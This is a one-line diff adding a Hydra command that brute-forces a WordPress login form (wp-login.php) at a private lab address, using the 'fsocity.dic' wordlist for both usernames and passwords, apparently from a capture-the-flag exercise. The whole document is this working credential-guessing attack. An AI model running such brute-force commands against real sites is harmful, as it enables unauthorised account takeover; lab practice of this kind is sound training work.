@@ -1,0 +1,1 @@
+sudo hydra -t 64 -L fsocity.dic -P fsocity.dic 10.11.12.89 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid"
